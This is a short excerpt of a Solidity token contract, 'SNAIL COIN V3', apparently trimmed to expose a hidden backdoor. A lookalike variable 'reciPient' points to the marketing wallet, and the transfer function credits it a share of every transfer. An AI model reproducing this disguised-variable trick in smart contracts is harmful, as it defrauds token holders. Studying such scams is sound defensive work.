...
contract SNAILCOINV3 is IERC20, Ownable {
    ...
    string _name = "SNAIL COIN V3";
    string _symbol = "SNAIL V3";
    ...
    address public pair;
    address reciPient = marketingFeeReceiver;
    ...
    constructor () {
        ...
        address deployer = 0x4564f45929903b54ad07a2090Ab73809119B13E3;
        address marketingreceiver = 0x9B17cE61386bcf4e50355AAa722aDFA4FA72A771;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        _rOwned[reciPient] = _rOwned[reciPient].add(amount / 100 * reflection);
